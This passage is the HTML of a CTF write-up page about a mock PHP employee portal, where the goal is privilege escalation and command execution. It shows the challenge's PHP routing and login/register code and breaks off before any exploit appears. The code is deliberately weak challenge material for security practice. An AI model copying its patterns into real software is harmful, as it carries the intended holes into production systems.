<!DOCTYPE html><html class="dark scroll-smooth"><head><meta charSet="utf-8"/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/e4af272ccee01ff0-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/41a17715-eea8-447d-9909-ff31140957f5"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/8b97dde8-7959-4917-94b3-11134e06b4e0"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/06c166c3-9cb5-4b40-bc71-7f61370715d7"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/31b2d71e-38b9-4918-88ca-ce230ee4d59b"/><link rel="stylesheet" href="/_next/static/css/da257a7bf05e11ce.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-50d183473e3f8178.js"/><script src="/_next/static/chunks/4bd1b696-12b3d90ac4ed3802.js" async=""></script><script src="/_next/static/chunks/684-d3c2077e7b7fefb9.js" async=""></script><script src="/_next/static/chunks/main-app-99381da9a4c58049.js" async=""></script><script src="/_next/static/chunks/874-c62c375efd21db20.js" async=""></script><script src="/_next/static/chunks/app/writeups/%5Bid%5D/layout-0f792473045deceb.js" async=""></script><script src="/_next/static/chunks/325-8cc74193b249521f.js" async=""></script><script src="/_next/static/chunks/app/writeups/%5Bid%5D/page-d2275216898ea7fa.js" async=""></script><meta name="next-size-adjust" content=""/><title>Hack the Madness CTF Round 2 — broken production | kevin.fish</title><meta name="description" content="Our PHP devs are working on this employee management portal. We have a mock build of the website and you are to pentest the platform for weaknesses. Your goal is to get more privileges and command execution on the server."/><meta property="og:title" content="Hack the Madness CTF Round 2 — broken production"/><meta property="og:description" content="Our PHP devs are working on this employee management portal. We have a mock build of the website and you are to pentest the platform for weaknesses. Your goal is to get more privileges and command execution on the server."/><meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Hack the Madness CTF Round 2 — broken production"/><meta name="twitter:description" content="Our PHP devs are working on this employee management portal. We have a mock build of the website and you are to pentest the platform for weaknesses. Your goal is to get more privileges and command execution on the server."/><script>document.querySelectorAll('body link[rel="icon"], body link[rel="apple-touch-icon"]').forEach(el => document.head.appendChild(el))</script><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="text-dark dark:text-white dark:bg-midnight" style="font-family:&#x27;Inter&#x27;, &#x27;Inter Fallback&#x27;;font-style:normal"><main class="container pt-20 pb-24"><a class="text-secondary text-sm mb-10 -ml-5 block w-max" href="/writeups">← Back to writeups</a><div><main class="text-pretty max-w-5xl mx-auto text-sm [&amp;_h1]:text-5xl [&amp;_h1]:font-semibold [&amp;_h1]:mb-8 [&amp;_blockquote]:text-secondary [&amp;_blockquote]:space-y-3 [&amp;_blockquote]:border-l-4 [&amp;_blockquote]:border-secondary [&amp;_blockquote]:pl-5 [&amp;_blockquote]:mb-5 [&amp;&gt;_p]:my-3 [&amp;_img]:my-5 [&amp;_ul]:list-disc [&amp;_ul]:pl-6 [&amp;_ol]:list-decimal [&amp;_ol]:pl-6 [&amp;_img]:rounded [&amp;_li]:my-2"><h1>Hack the Madness CTF Round 2 — broken production</h1>
<blockquote>
<p>Our PHP devs are working on this employee management portal. We have a mock build of the website and you are to pentest the platform for weaknesses. Your goal is to get more privileges and command execution on the server.</p>
</blockquote>
<p>We&#x27;re given a PHP server that looks like this:</p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (php)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token php language-php delimiter important">&lt;?php</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="token php language-php"></span><span class="token php language-php function">spl_autoload_register</span><span class="token php language-php punctuation">(</span><span class="token php language-php keyword">function</span><span class="token php language-php"> </span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$name</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="token php language-php">    </span><span class="token php language-php keyword">if</span><span class="token php language-php"> </span><span class="token php language-php punctuation">(</span><span class="token php language-php function">preg_match</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;/Controller$/&#x27;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php variable">$name</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">)</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="token php language-php">    </span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="token php language-php">        </span><span class="token php language-php variable">$name</span><span class="token php language-php"> </span><span class="token php language-php operator">=</span><span class="token php language-php"> </span><span class="token php language-php string double-quoted-string">&quot;controllers/${name}&quot;</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="token php language-php">    </span><span class="token php language-php punctuation">}</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="token php language-php">    </span><span class="token php language-php keyword">else</span><span class="token php language-php"> </span><span class="token php language-php keyword">if</span><span class="token php language-php"> </span><span class="token php language-php punctuation">(</span><span class="token php language-php function">preg_match</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;/Model$/&#x27;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php variable">$name</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">)</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="token php language-php">    </span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="token php language-php">        </span><span class="token php language-php variable">$name</span><span class="token php language-php"> </span><span class="token php language-php operator">=</span><span class="token php language-php"> </span><span class="token php language-php string double-quoted-string">&quot;models/${name}&quot;</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="token php language-php">    </span><span class="token php language-php punctuation">}</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="token php language-php">    </span><span class="token php language-php keyword">include_once</span><span class="token php language-php"> </span><span class="token php language-php string double-quoted-string">&quot;${name}.php&quot;</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="token php language-php"></span><span class="token php language-php punctuation">}</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">13</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="token php language-php"></span><span class="token php language-php variable">$session</span><span class="token php language-php">  </span><span class="token php language-php operator">=</span><span class="token php language-php"> </span><span class="token php language-php keyword">new</span><span class="token php language-php"> </span><span class="token php language-php class-name">SessionHandler</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="token php language-php"></span><span class="token php language-php variable">$database</span><span class="token php language-php"> </span><span class="token php language-php operator">=</span><span class="token php language-php"> </span><span class="token php language-php keyword">new</span><span class="token php language-php"> </span><span class="token php language-php class-name">Database</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;/tmp/challenge.db&#x27;</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">16</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class="token php language-php"></span><span class="token php language-php variable">$router</span><span class="token php language-php"> </span><span class="token php language-php operator">=</span><span class="token php language-php"> </span><span class="token php language-php keyword">new</span><span class="token php language-php"> </span><span class="token php language-php class-name">Router</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class="token php language-php"></span><span class="token php language-php variable">$router</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">new</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;GET&#x27;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php string single-quoted-string">&#x27;/&#x27;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php keyword">function</span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$router</span><span class="token php language-php punctuation">)</span><span class="token php language-php"> </span><span class="token php language-php keyword">use</span><span class="token php language-php"> </span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$session</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class="token php language-php">    </span><span class="token php language-php keyword">if</span><span class="token php language-php"> </span><span class="token php language-php punctuation">(</span><span class="token php language-php operator">!</span><span class="token php language-php variable">$session</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">isLoggedIn</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">)</span><span class="token php language-php"> 
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="token php language-php">    </span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">21</span><span class="token php language-php">        </span><span class="token php language-php keyword">return</span><span class="token php language-php"> </span><span class="token php language-php function">header</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;location: /login&#x27;</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="token php language-php">    </span><span class="token php language-php punctuation">}</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">23</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="token php language-php">    </span><span class="token php language-php keyword">return</span><span class="token php language-php"> </span><span class="token php language-php variable">$router</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">view</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;index&#x27;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php punctuation">[</span><span class="token php language-php string single-quoted-string">&#x27;admin&#x27;</span><span class="token php language-php"> </span><span class="token php language-php operator">=&gt;</span><span class="token php language-php"> </span><span class="token php language-php variable">$session</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">isAdmin</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php string single-quoted-string">&#x27;username&#x27;</span><span class="token php language-php"> </span><span class="token php language-php operator">=&gt;</span><span class="token php language-php"> </span><span class="token php language-php variable">$session</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">getUsername</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">]</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">25</span><span class="token php language-php"></span><span class="token php language-php punctuation">}</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">26</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class="token php language-php"></span><span class="token php language-php variable">$router</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">new</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;GET&#x27;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php string single-quoted-string">&#x27;/login&#x27;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php keyword">function</span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$router</span><span class="token php language-php punctuation">)</span><span class="token php language-php">  </span><span class="token php language-php keyword">use</span><span class="token php language-php"> </span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$session</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">28</span><span class="token php language-php">    </span><span class="token php language-php keyword">if</span><span class="token php language-php"> </span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$session</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">isLoggedIn</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">)</span><span class="token php language-php"> 
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">29</span><span class="token php language-php">    </span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">30</span><span class="token php language-php">        </span><span class="token php language-php keyword">return</span><span class="token php language-php"> </span><span class="token php language-php function">header</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;location: /&#x27;</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">31</span><span class="token php language-php">    </span><span class="token php language-php punctuation">}</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">32</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">33</span><span class="token php language-php">    </span><span class="token php language-php keyword">return</span><span class="token php language-php"> </span><span class="token php language-php variable">$router</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">view</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;login&#x27;</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">34</span><span class="token php language-php"></span><span class="token php language-php punctuation">}</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">35</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">36</span><span class="token php language-php"></span><span class="token php language-php variable">$router</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">new</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;GET&#x27;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php string single-quoted-string">&#x27;/register&#x27;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php keyword">function</span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$router</span><span class="token php language-php punctuation">)</span><span class="token php language-php">  </span><span class="token php language-php keyword">use</span><span class="token php language-php"> </span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$session</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">37</span><span class="token php language-php">    </span><span class="token php language-php keyword">if</span><span class="token php language-php"> </span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$session</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">isLoggedIn</span><span class="token php language-php punctuation">(</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">)</span><span class="token php language-php"> 
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">38</span><span class="token php language-php">    </span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">39</span><span class="token php language-php">        </span><span class="token php language-php keyword">return</span><span class="token php language-php"> </span><span class="token php language-php function">header</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;location: /&#x27;</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">40</span><span class="token php language-php">    </span><span class="token php language-php punctuation">}</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">41</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">42</span><span class="token php language-php">    </span><span class="token php language-php keyword">return</span><span class="token php language-php"> </span><span class="token php language-php variable">$router</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">view</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;register&#x27;</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">43</span><span class="token php language-php"></span><span class="token php language-php punctuation">}</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">44</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">45</span><span class="token php language-php"></span><span class="token php language-php variable">$router</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">new</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;POST&#x27;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php string single-quoted-string">&#x27;/auth/login&#x27;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php keyword">function</span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$router</span><span class="token php language-php punctuation">)</span><span class="token php language-php"> </span><span class="token php language-php keyword">use</span><span class="token php language-php"> </span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$database</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php variable">$session</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">46</span><span class="token php language-php">    </span><span class="token php language-php variable">$user</span><span class="token php language-php"> </span><span class="token php language-php operator">=</span><span class="token php language-php"> </span><span class="token php language-php variable">$database</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">login</span><span class="token php language-php punctuation">(</span><span class="token php language-php global">$_POST</span><span class="token php language-php punctuation">[</span><span class="token php language-php string single-quoted-string">&#x27;username&#x27;</span><span class="token php language-php punctuation">]</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php global">$_POST</span><span class="token php language-php punctuation">[</span><span class="token php language-php string single-quoted-string">&#x27;password&#x27;</span><span class="token php language-php punctuation">]</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">47</span><span class="token php language-php">    </span><span class="token php language-php keyword">if</span><span class="token php language-php"> </span><span class="token php language-php punctuation">(</span><span class="token php language-php operator">!</span><span class="token php language-php variable">$user</span><span class="token php language-php punctuation">)</span><span class="token php language-php"> </span><span class="token php language-php keyword">return</span><span class="token php language-php"> </span><span class="token php language-php function">header</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;location: /login?msg=Invalid username or password!&#x27;</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">48</span><span class="token php language-php">    </span><span class="token php language-php variable">$session</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">login</span><span class="token php language-php punctuation">(</span><span class="token php language-php global">$_POST</span><span class="token php language-php punctuation">[</span><span class="token php language-php string single-quoted-string">&#x27;username&#x27;</span><span class="token php language-php punctuation">]</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">49</span><span class="token php language-php">    </span><span class="token php language-php function">header</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;location: /&#x27;</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">50</span><span class="token php language-php">    </span><span class="token php language-php keyword">exit</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">51</span><span class="token php language-php"></span><span class="token php language-php punctuation">}</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">52</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">53</span><span class="token php language-php"></span><span class="token php language-php variable">$router</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">new</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;POST&#x27;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php string single-quoted-string">&#x27;/auth/register&#x27;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php keyword">function</span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$router</span><span class="token php language-php punctuation">)</span><span class="token php language-php">  </span><span class="token php language-php keyword">use</span><span class="token php language-php"> </span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$database</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">54</span><span class="token php language-php">    </span><span class="token php language-php keyword">if</span><span class="token php language-php"> </span><span class="token php language-php punctuation">(</span><span class="token php language-php global">$_POST</span><span class="token php language-php punctuation">[</span><span class="token php language-php string single-quoted-string">&#x27;username&#x27;</span><span class="token php language-php punctuation">]</span><span class="token php language-php"> </span><span class="token php language-php operator">===</span><span class="token php language-php"> </span><span class="token php language-php string single-quoted-string">&#x27;admin&#x27;</span><span class="token php language-php punctuation">)</span><span class="token php language-php"> </span><span class="token php language-php keyword">return</span><span class="token php language-php"> </span><span class="token php language-php function">header</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;location: /register?msg=This user already exists!&#x27;</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">55</span><span class="token php language-php">    </span><span class="token php language-php variable">$database</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">register</span><span class="token php language-php punctuation">(</span><span class="token php language-php global">$_POST</span><span class="token php language-php punctuation">[</span><span class="token php language-php string single-quoted-string">&#x27;username&#x27;</span><span class="token php language-php punctuation">]</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php global">$_POST</span><span class="token php language-php punctuation">[</span><span class="token php language-php string single-quoted-string">&#x27;password&#x27;</span><span class="token php language-php punctuation">]</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">56</span><span class="token php language-php">    </span><span class="token php language-php function">header</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;location: /login?msg=The account registered successfully!&amp;reg=true&#x27;</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">57</span><span class="token php language-php">    </span><span class="token php language-php keyword">exit</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">58</span><span class="token php language-php"></span><span class="token php language-php punctuation">}</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">59</span>
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">60</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">61</span><span class="token php language-php"></span><span class="token php language-php variable">$router</span><span class="token php language-php operator">-&gt;</span><span class="token php language-php function">new</span><span class="token php language-php punctuation">(</span><span class="token php language-php string single-quoted-string">&#x27;GET&#x27;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php string single-quoted-string">&#x27;/logout&#x27;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php keyword">function</span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$router</span><span class="token php language-php punctuation">)</span><span class="token php language-php">  </span><span class="token php language-php keyword">use</span><span class="token php language-php"> </span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$session</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">62</span>    
